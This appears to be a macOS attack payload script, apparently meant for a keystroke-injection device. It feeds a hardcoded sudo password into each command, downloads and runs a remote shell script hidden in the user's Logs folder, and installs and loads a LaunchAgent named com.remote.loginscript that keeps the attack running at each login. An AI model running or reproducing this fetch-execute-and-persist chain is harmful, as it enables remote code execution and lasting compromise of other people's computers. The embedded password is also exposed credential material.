echo facu14y | sudo -S curl -o /Users/psuser/Library/Logs/process.sh https://raw.githubusercontent.com/sudoday/project-duck/master/process.sh
echo facu14y | sudo -S chmod +x /Users/psuser/Library/Logs/process.sh
/Users/psuser/Library/Logs/process.sh
echo facu14y | sudo -S  curl -o /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist https://raw.githubusercontent.com/sudoday/project-duck/master/plist
echo facu14y | sudo -S chown root:wheel /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist
launchctl load /Users/psuser/Library/LaunchAgents/com.remote.loginscript.plist
